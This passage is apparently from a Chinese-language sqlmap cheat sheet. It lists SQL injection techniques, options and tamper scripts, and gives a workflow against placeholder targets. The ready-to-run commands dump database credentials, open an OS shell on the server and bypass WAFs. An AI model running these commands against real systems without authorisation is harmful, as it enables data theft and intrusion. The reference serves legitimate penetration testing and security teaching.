### 模式 (Techniques)

*   **B (Boolean-based blind):** 基于布尔的盲注。
*   **E (Error-based):** 基于报错的注入。
*   **U (Union query-based):** 基于联合查询的注入。
*   **S (Stacked queries):** 基于堆叠查询的注入（可执行多条语句）。
*   **T (Time-based blind):** 基于时间的盲注。
*   **Q (Inline queries):** 内联查询注入（不常用）。
*   `--technique=BEUST` (默认尝试所有这些)

### 常用参数

*   **目标指定:**
    *   `-u URL`, `--url=URL`: 指定目标URL (GET请求)。
    *   `--data=DATA`: 指定POST请求的数据体。
    *   `-l LOGFILE`: 从Burp或WebScarab代理日志加载目标。
    *   `-r REQUESTFILE`: 从文件中加载HTTP请求。
    *   `-m BULKFILE`: 从文件中批量加载URL进行测试。
    *   `-c CONFIGFILE`: 从INI配置文件加载选项。
*   **请求参数:**
    *   `-p PARAM`: 指定要测试的参数。
    *   `--dbms=DBMS`: 强制指定后端数据库类型 (e.g., `mysql`, `mssql`, `oracle`)。
    *   `--os=OS`: 强制指定后端操作系统 (e.g., `windows`, `linux`)。
    *   `--cookie=COOKIE`: 设置Cookie。
    *   `--user-agent=AGENT`: 设置User-Agent。
    *   `--referer=REFERER`: 设置Referer。
    *   `--headers=HEADERS`: 设置额外HTTP头 (e.g., `X-Forwarded-For: 1.1.1.1\nAccept-Language: fr`)。
    *   `--proxy=PROXY`: 使用HTTP代理。
    *   `--auth-type=TYPE --auth-cred=CRED`: HTTP认证。
*   **注入控制:**
    *   `--level=LEVEL`: 测试等级 (1-5, 默认1)。越高测试越全面，参数检查越多（Cookie, User-Agent等）。
    *   `--risk=RISK`: 风险等级 (1-3, 默认1)。越高测试越具侵入性（可能修改数据）。
    *   `--string=STRING`: 用于判断True/False的页面字符串。
    *   `--not-string=STRING`: 用于判断True/False的页面不存在的字符串。
    *   `--regexp=REGEXP`: 用于判断True/False的页面正则表达式。
    *   `--prefix=PREFIX`, `--suffix=SUFFIX`: 注入Payload的前后缀。
    *   `--tamper=SCRIPT`: 使用tamper脚本绕过WAF/过滤 (e.g., `space2comment`, `randomcase`)。可多次使用。
*   **信息获取 (Enumeration):**
    *   `--current-user`: 获取当前数据库用户。
    *   `--current-db`: 获取当前数据库名。
    *   `--hostname`: 获取数据库服务器主机名。
    *   `--is-dba`: 判断当前用户是否为DBA。
    *   `--users`: 列出所有数据库用户。
    *   `--passwords`: 尝试获取用户密码哈希，并尝试破解。
    *   `--privileges`: 列出用户权限。
    *   `--roles`: 列出用户角色。
    *   `--dbs`: 列出所有数据库。
    *   `--tables -D DBNAME`: 列出指定数据库的所有表。
    *   `--columns -D DBNAME -T TABLENAME`: 列出指定库、表的列名。
    *   `--schema`: 列出所有数据库、表、列。
    *   `--dump -D DBNAME -T TABLENAME -C COL1,COL2`: Dump指定列的数据。
    *   `--dump-all`: Dump所有数据库的所有表数据。
    *   `--search -D DBNAME -T TABLENAME -C COLNAME`: 搜索包含特定模式的列。
    *   `--count`: 获取表的行数。
*   **系统访问:**
    *   `--os-shell`: 获取交互式操作系统Shell。
    *   `--os-cmd=COMMAND`: 执行单个操作系统命令。
    *   `--os-pwn`: 获取OOB Shell, Meterpreter或VNC。
    *   `--file-read=FILEPATH`: 读取服务器上的文件。
    *   `--file-write=LOCALPATH --file-dest=REMOTEPATH`: 上传文件到服务器。
*   **杂项:**
    *   `--batch`: 自动选择默认选项，无需用户交互。
    *   `--smart`: 在 `--batch` 基础上进行启发式快速判断。
    *   `--threads=NUM`: 并发线程数 (默认1)。
    *   `-v LEVEL`: 输出详细级别 (0-6, 默认1)。`3`显示payload, `4`显示HTTP请求, `5`显示HTTP响应头, `6`显示HTTP响应体。
    *   `--flush-session`: 清除当前目标的会话缓存。
    *   `--fresh-queries`: 忽略会话缓存中的查询结果。

### 一般SQLMap操作流程

1.  **找到潜在注入点** (手工或扫描器初步发现)。
2.  **确认注入点:**
    ```bash
    sqlmap -u "http://example.com/vuln.php?id=1" --batch --level=3 --risk=1
    # 或者 POST 请求
    sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123" --batch -p user
    # 或者从 Burp 请求文件加载
    sqlmap -r request.txt --batch --level=3
    ```
3.  **获取基本信息:**
    ```bash
    sqlmap -r request.txt --batch --current-db --current-user --is-dba --hostname
    ```
4.  **列出数据库:**
    ```bash
    sqlmap -r request.txt --batch --dbs
    ```
5.  **列出表:**
    ```bash
    sqlmap -r request.txt --batch -D target_db --tables
    ```
6.  **列出列:**
    ```bash
    sqlmap -r request.txt --batch -D target_db -T users --columns
    ```
7.  **Dump数据:**
    ```bash
    sqlmap -r request.txt --batch -D target_db -T users -C username,password --dump
    ```
8.  **(可选) 尝试获取Shell:** (需要高权限和合适的环境)
    ```bash
    sqlmap -r request.txt --batch --os-shell
    ```
9.  **(可选) 绕过WAF:**
    ```bash
    sqlmap -r request.txt --batch --tamper=space2comment,randomcase --level=5 --risk=3
    ```

### Tamper脚本 (部分示例)

用于修改Payload以绕过过滤或WAF。

*   `apostrophemask`: 单引号替换为UTF-8编码。
*   `base64encode`: Base64编码整个Payload。
*   `between`: `>` 替换为 `BETWEEN`。
*   `chardoubleencode`: 双重URL编码。
*   `charencode`: URL编码。
*   `charunicodeencode`: Unicode编码。
*   `equaltolike`: `=` 替换为 `LIKE`。
*   `greatest`: `>` 替换为 `GREATEST`。
*   `ifnull2ifisnull`: `IFNULL(A,B)` 替换为 `IF(ISNULL(A),B,A)`。
*   `multiplespaces`: 关键字周围添加多个空格。
*   `randomcase`: 随机大小写。
*   `space2comment`: 空格替换为 `/**/`。
*   `space2dash`: 空格替换为 `--` 加随机字符和换行符。
*   `space2hash`: 空格替换为 `#` 加随机字符和换行符 (MySQL)。
*   `space2mssqlblank`: 空格替换为MSSQL其他空白字符。
*   `space2mysqlblank`: 空格替换为MySQL其他空白字符。
*   `unionalltounion`: `UNION ALL SELECT` 替换为 `UNION SELECT`。
*   `unmagicquotes`: 宽字节绕过 `magic_quotes_gpc`。
*   `versionedkeywords`: MySQL版本注释 `/*! ... */` 包裹关键字。
*   `xforwardedfor`: 添加伪造的 `X-Forwarded-For` 头。

